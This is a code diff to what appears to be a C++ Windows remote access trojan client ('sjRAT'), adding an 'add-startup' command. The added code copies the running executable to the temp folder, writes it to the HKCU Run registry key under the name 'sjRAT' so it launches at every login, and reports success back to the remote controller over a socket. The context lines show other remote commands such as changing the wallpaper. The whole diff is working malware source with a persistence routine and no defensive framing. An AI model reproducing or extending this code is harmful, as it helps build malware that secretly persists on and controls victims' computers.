@@ -422,6 +422,39 @@ int main(int argc, char* argv[])
 
                 SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filePath.c_str(), SPIF_UPDATEINIFILE);
             }
+            else if (command == "add-startup") {
+                /* copy file to temp */
+
+                // get temp path
+                CHAR tempPath[MAX_PATH];
+                GetTempPathA(MAX_PATH, tempPath);
+
+                // get full path to exe file (client.exe)
+                CHAR szModulePath[MAX_PATH];
+                GetModuleFileName(NULL, szModulePath, MAX_PATH);
+
+                // combine file and temp dir paths (%temp%/client.exe)
+                CHAR szTempFilePath[MAX_PATH];
+                PathCombine(szTempFilePath, tempPath, PathFindFileName(szModulePath));
+
+                // copying
+                CopyFile(szModulePath, szTempFilePath, FALSE);
+
+                /* add to start up */
+
+                HKEY hKey;
+                LPCSTR lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+                LPCSTR lpValueName = "sjRAT";
+
+                RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_SET_VALUE, &hKey);
+                
+                RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (BYTE*)szTempFilePath, sizeof(szTempFilePath));
+
+                RegCloseKey(hKey);
+
+                std::string callback = std::string(szModulePath) + " was copied to \%temp\% and added to startup";
+                send(s, callback.c_str(), callback.size(), 0);
+            }
 
             else if (command == "exit" || command == "quit" || command == "bye") {
                 std::string callback = "Client terminated...";
